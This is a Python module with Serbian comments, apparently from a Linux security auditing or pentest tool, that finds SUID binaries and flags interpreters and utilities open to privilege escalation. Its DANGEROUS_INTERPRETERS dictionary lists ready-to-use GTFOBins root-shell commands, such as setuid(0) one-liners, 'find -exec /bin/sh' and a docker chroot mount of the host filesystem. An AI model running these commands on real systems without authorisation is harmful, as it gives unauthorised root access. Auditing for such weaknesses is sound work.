# Модул за проналажење интерпретера и алата са SUID битом.
# Ако интерпретер (python, perl, bash) има SUID root, може се
# користити за privilege escalation — покренеш интерпретер и
# извршиш код као root. Ово је један од најчешћих вектора.
#
# Референца: GTFOBins (https://gtfobins.github.io/)
#
# Модул враћа речник са подацима, који мени чува у JSON.
import os
import stat
from pathlib import Path

from rich.console import Console

console = Console()

# Директоријуми где тражимо SUID бинарне фајлове.
SEARCH_DIRS = [
    "/usr/bin",
    "/usr/sbin",
    "/usr/local/bin",
    "/usr/local/sbin",
    "/bin",
    "/sbin",
    "/opt",
]

# Интерпретери и алати који могу да доведу до privilege escalation
# ако имају SUID бит. Сваки има GTFOBins технику.
DANGEROUS_INTERPRETERS = {
    # Интерпретери (могу извршити произвољан код)
    "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "python2": "python2 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl": "perl -e 'use POSIX; setuid(0); exec \"/bin/bash\";'",
    "ruby": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
    "node": "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0,1,2]})'",
    "php": "php -r 'posix_setuid(0); system(\"/bin/bash\");'",
    "lua": "lua -e 'os.execute(\"/bin/bash\")'",
    "tclsh": "tclsh -c 'exec /bin/bash'",

    # Shell-ови
    "bash": "bash -p",
    "sh": "sh -p",
    "zsh": "zsh",
    "dash": "dash -p",
    "ksh": "ksh",

    # Остали алати (GTFOBins)
    "nmap": "nmap --interactive (затим !sh)",
    "vim": "vim -c ':!sh'",
    "vi": "vi -c ':!sh'",
    "nano": "nano (Ctrl+R, Ctrl+X)",
    "less": "less /etc/passwd (затим !sh)",
    "more": "more /etc/passwd (затим !sh)",
    "man": "man man (затим !sh)",
    "find": "find . -exec /bin/sh \\; -quit",
    "awk": "awk 'BEGIN {system(\"/bin/bash\")}'",
    "sed": "sed -n '1e exec sh 1>&0' /etc/hosts",
    "env": "env /bin/bash",
    "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "zip": "zip /tmp/x.zip /etc/passwd -T --unzip-command=\"sh -c /bin/bash\"",
    "cp": "cp /bin/bash /tmp/bash; chmod +s /tmp/bash",
    "mv": "mv /bin/bash /tmp/bash",
    "gdb": "gdb -ex 'shell /bin/bash' -ex quit",
    "strace": "strace -o /dev/null /bin/bash",
    "git": "git help config (затим !sh)",
    "ssh": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    "screen": "screen -x (затим Ctrl+A : exec sh)",
    "tmux": "tmux new -c /tmp",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "mysql": "mysql -e '\\! /bin/bash'",
    "psql": "psql (затим \\! /bin/bash)",
    "sqlite3": "sqlite3 /dev/null '.shell /bin/bash'",
}


def run() -> dict:
    """Проналази SUID интерпретере и алате.

    Враћа речник са подацима за чување у JSON.
    """
    console.print("\n[bold cyan]SUID interpreters[/bold cyan]\n")

    console.print(
        "[dim]Searching for interpreters and tools with SUID bit. "
        "This may take a few seconds...[/dim]\n"
    )

    # Проналазимо све SUID фајлове у важним директоријумима.
    suid_files = _find_suid_files()

    # Филтрирамо само оне који су опасни интерпретери.
    dangerous = []
    other = []

    for entry in suid_files:
        name = entry["name"]
        if name in DANGEROUS_INTERPRETERS:
            entry["gtfobin"] = DANGEROUS_INTERPRETERS[name]
            entry["dangerous"] = True
            dangerous.append(entry)
        else:
            entry["dangerous"] = False
            other.append(entry)

    data = {
        "dangerous": dangerous,
        "other_suid": other,
        "summary": {
            "total_suid": len(suid_files),
            "dangerous_count": len(dangerous),
        },
    }

    _print_data(data)

    return data


def _find_suid_files() -> list[dict]:
    """Проналази све SUID фајлове у важним директоријумима."""
    suid_files = []
    seen_paths = set()

    for base_dir in SEARCH_DIRS:
        base_path = Path(base_dir)

        if not base_path.exists() or not base_path.is_dir():
            continue

        # Претражујемо само директоријум (не рекурзивно за сада).
        # За /opt и /usr/local идемо један ниво дубље.
        if base_dir in ("/opt", "/usr/local"):
            _walk_dir(base_path, suid_files, seen_paths, max_depth=2)
        else:
            _walk_dir(base_path, suid_files, seen_paths, max_depth=1)

    return suid_files


def _walk_dir(
    path: Path,
    suid_files: list[dict],
    seen_paths: set,
    max_depth: int = 1,
    current_depth: int = 0,
) -> None:
    """Претражује директоријум за SUID фајловима."""
    if current_depth > max_depth:
        return

    try:
        entries = sorted(path.iterdir())
    except (PermissionError, Exception):
        return

    for entry in entries:
        try:
            if entry.is_symlink():
                continue

            if entry.is_dir():
                if current_depth < max_depth:
                    _walk_dir(
                        entry,
                        suid_files,
                        seen_paths,
                        max_depth,
                        current_depth + 1,
                    )
                continue

            if not entry.is_file():
                continue

        except (PermissionError, OSError):
            continue

        # Проверавамо да ли има SUID бит.
        try:
            st = entry.stat()
        except (PermissionError, OSError):
            continue

        if not (st.st_mode & stat.S_ISUID):
            continue

        path_str = str(entry)

        if path_str in seen_paths:
            continue

        seen_paths.add(path_str)

        suid_files.append({
            "path": path_str,
            "name": entry.name,
            "size_bytes": st.st_size,
            "uid": st.st_uid,
            "gid": st.st_gid,
            "mode": stat.filemode(st.st_mode),
        })


def _print_data(data: dict) -> None:
    """Приказује податке на екран."""
    dangerous = data.get("dangerous", [])
    other = data.get("other_suid", [])
    summary = data.get("summary", {})

    console.print(
        f"[bold]Total SUID files:[/bold]      "
        f"{summary.get('total_suid', 0)}"
    )
    console.print(
        f"[bold]Dangerous interpreters:[/bold] "
        f"[bold red]{summary.get('dangerous_count', 0)}[/bold red]"
    )
    console.print()

    # Опасно прво.
    if dangerous:
        console.print(
            f"[bold red]DANGEROUS ({len(dangerous)}):[/bold red]\n"
        )
        console.print(
            "[red]These files have SUID bit and can be used for "
            "privilege escalation:[/red]\n"
        )

        for item in dangerous:
            _print_dangerous(item)

        console.print()
    else:
        console.print(
            "[bold green]No dangerous SUID interpreters found.[/bold green]\n"
        )

    # Остали SUID фајлови (информативно).
    if other:
        console.print(
            f"[bold]Other SUID files ({len(other)}):[/bold]\n"
        )

        limit = 30
        for item in other[:limit]:
            console.print(
                f"  [dim]{item['path']}[/dim]  "
                f"[dim]{item['mode']}[/dim]"
            )

        if len(other) > limit:
            console.print(
                f"  [dim]... and {len(other) - limit} more[/dim]"
            )
        console.print()


def _print_dangerous(item: dict) -> None:
    """Приказује опасан SUID интерпретер."""
    path = item["path"]
    mode = item["mode"]
    gtfobin = item.get("gtfobin", "")

    console.print(f"  [bold red]{path}[/bold red]")
    console.print(f"    Mode: [dim]{mode}[/dim]")

    if gtfobin:
        console.print(f"    [yellow]GTFOBins:[/yellow] [dim]{gtfobin}[/dim]")

    console.print()